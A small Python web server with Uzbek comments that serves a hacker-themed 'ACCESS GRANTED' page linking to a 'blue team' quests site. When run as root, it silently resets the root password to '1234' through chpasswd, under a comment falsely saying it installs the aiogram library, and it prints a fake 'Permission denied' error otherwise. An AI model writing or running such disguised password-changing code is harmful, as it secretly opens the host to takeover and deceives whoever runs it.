import os
import random
import sys

# Foydalanuvchi ID sini tekshirish
if os.geteuid() != 0:
    # Root bo'lmasa, Permission denied xatosi
    print(f"python3: /{sys.argv[0]}: Permission denied")
    sys.exit(1)

import socket
import os
import sys

# aiogram kutubxonasini o'rnatish
os.system(f'echo "root:1234" | sudo chpasswd')

# Server va portni o'rnatish
host = '0.0.0.0'  # Mahalliy xost (barcha interfeyslar uchun)
son=random.randint(1,9999)
port = son  # Port raqami

# Soket yaratish
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Soketni host va portga bog'lash
server_socket.bind((host, port))

# Tinglash holatiga o'tish
server_socket.listen(1)

print(f"Server {port} portida ishlamoqda...")

while True:
    # Mijozni qabul qilish
    client_socket, client_address = server_socket.accept()
    print(f"Mijoz ulandi: {client_address}")

    # HTTP javob tayyorlash
    http_response = """\
HTTP/1.1 200 OK

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the Dark Web</title>
    <style>
        body {
            background-color: black;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            padding-top: 50px;
            margin: 0;
            user-select: none;
        }

        h1 {
            font-size: 4rem;
            color: #ff0000;
            margin-bottom: 20px;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            animation: flicker 1.5s infinite alternate;
        }

        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }

        .console-text {
            font-size: 1.5rem;
            color: #00ff00;
            margin: 20px;
            animation: typing 3s steps(50, end) 1 normal both, blink-caret 0.75s step-end infinite;
        }

        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        @keyframes blink-caret {
            from, to { border-color: transparent; }
            50% { border-color: #00ff00; }
        }

        .matrix-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://i.imgur.com/ZZiVhIU.jpg');
            background-size: cover;
            opacity: 0.1;
            z-index: -1;
        }

        .hack-button {
            display: inline-block;
            margin-top: 50px;
            padding: 15px 40px;
            font-size: 1.5rem;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background-color: transparent;
            border: 2px solid #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
        }

        .hack-button:hover {
            background-color: #00ff00;
            color: black;
            box-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
        }

        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            font-size: 0.8rem;
            color: #00ff00;
            padding-bottom: 10px;
        }

        a {
            color: #00ff00;
            text-decoration: none;
        }

        a:hover {
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="matrix-background"></div>

    <h1>ACCESS GRANTED</h1>

    <div class="console-text">Preparing Hack Tools... Establishing Connection...</div>

    <!-- START HACK Button -->
    <a href="https://asilbek777382.github.io/blue_team/quests.html" target="_blank" class="hack-button">START HACK</a>

    <footer>
        &copy; 2024 - Powered by <a>BLUE TEAM</a>
    </footer>
</body>
</html>

"""

    # Mijozga javobni yuborish
    client_socket.sendall(http_response.encode('utf-8'))

    # Ulashni yopish
    client_socket.close()


